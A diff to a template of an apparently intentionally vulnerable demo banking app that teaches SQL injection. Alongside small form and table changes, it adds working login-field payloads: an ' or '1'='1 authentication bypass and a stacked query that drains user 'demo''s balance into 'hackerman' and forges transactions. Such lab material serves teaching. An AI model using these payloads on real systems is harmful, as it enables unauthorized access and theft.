@@ -21,10 +21,14 @@
           <input type="number" step="0.01" min="0.01" class="form-control" id="amount" name="amount" required>
         </div>
         <div class="form-group">
+          <label for="note">Note:</label>
+          <input type="text" class="form-control" id="note" name="note">
+        </div>
+        <div class="form-group">
           <label for="type">Transaction Type:</label>
           <select class="form-control" id="type" name="type" required>
-            <option value="deposit">Deposit</option>
-            <option value="withdraw">Withdraw</option>
+            <option value="Deposit">Deposit</option>
+            <option value="Withdrawal">Withdraw</option>
           </select>
         </div>
         <button type="submit" class="btn btn-primary2 mt-2">Submit</button>
@@ -40,6 +44,8 @@
       <thead>
         <tr>
           <th>Amount</th>
+          <th>Transaction Type</th>
+          <th>Note</th>
           <th>Date</th>
         </tr>
       </thead>
@@ -47,6 +53,8 @@
         {% for transaction in transactions %}
         <tr>
           <td>${{ transaction.amount }}</td>
+          <td>{{ transaction.type }}</td>
+          <td>{{ transaction.note }}</td>
           <td>{{ transaction.transaction_date }}</td>
         </tr>
         {% endfor %}
@@ -86,6 +94,43 @@
       <p>The attacker can use SQL Injection to extract sensitive data such as usernames, passwords, and credit card information or modify the database's contents, changing records, and inserting new data. This attack can occur when developers do not properly validate user inputs and trust that the data sent to the server is correct.</p>
       <h2 class="mt-5">Conclusion</h2>
       <p>Always sanitize your data! By ensuring all data inputs are properly sanitized before they are processed by the application, we can guard against this type of vulnerability.</p>
+    </div>
+    <hr class="mt-5">
+    <div class="col-md-8 mx-auto">
+      <h2 class="mt-5">SQL Injections you can try (EASY):</h2>
+      <p>Enter a username into the login field followed by ' or '1'='1</p>
+      <p>This will let you bypass the password and login as that user.</p>
+      <h2 class="mt-5">SQL Injections you can try (COMPLEX):</h2>
+      <p>Paste the following into the username field. An error will be thrown but the statement will still execute. This query will transfer the entire balance from account with username 'demo' to account 'hackerman'</p>
+      <p>
+        '; UPDATE bank_bankaccount
+        SET balance = balance + (SELECT balance FROM bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo'))
+        WHERE owner_id = (SELECT id FROM auth_user WHERE username='hackerman');
+
+        INSERT INTO bank_transaction (bank_account_id, amount, note, type, transaction_date)
+        VALUES (
+          (SELECT id FROM bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='hackerman')),
+          (SELECT balance from bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo')),
+          'All of demo users money!',
+          'Deposit',
+          '0'
+        );
+
+        INSERT INTO bank_transaction (bank_account_id, amount, note, type, transaction_date)
+        VALUES (
+          (SELECT id FROM bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo')),
+          -1*(SELECT balance from bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo')),
+          'Youve been hacked by the infamous Hackerman!',
+          'Withdrawal',
+          '0'
+        );
+
+        UPDATE bank_bankaccount
+        SET balance = 0
+        WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo'); 
+
+        SELECT * FROM auth_user WHERE username='fail
+      </p>
     </div>
   <div>
 </div>
